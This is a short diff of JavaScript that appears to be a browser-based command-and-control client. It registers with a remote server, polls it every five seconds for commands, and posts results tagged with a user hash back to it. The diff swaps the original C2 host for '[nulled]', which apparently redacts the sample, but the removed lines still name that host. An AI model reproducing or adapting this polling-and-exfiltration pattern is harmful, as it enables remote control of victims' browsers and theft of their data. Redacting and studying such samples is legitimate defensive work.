@@ -9,7 +9,7 @@ function n(){
 }
 function rR(){
 	$.ajax({
-		url:"http://useless-no.de:8080/rer",
+		url:"[nulled]/rer",
 		type:"post",
 		data:{
 			'id':u.userhash,
@@ -40,7 +40,7 @@ function ci(){
 		setTimeout(ci, 5000);
 	};
  	$.ajax({
-		url:"http://useless-no.de:8080/cmd",
+		url:"[nulled]/cmd",
 		type:"get",
 		datatype:"json",
 		data:{'id':u.userhash},
@@ -54,13 +54,13 @@ function co(d){
 	rO.data = d;
 	var r = JSON.stringify(rO);
 		$.ajax({
-		url:"http://useless-no.de:8080/ret",
+		url:"[nulled]/ret",
 		type:"post",
 		data:"data=" + r
 		});
 }
 $.ajax({
-	url:"http://useless-no.de:8080/reg",
+	url:"[nulled]/reg",
 	type:"get",
 	datatype:"json",
 	success:uU
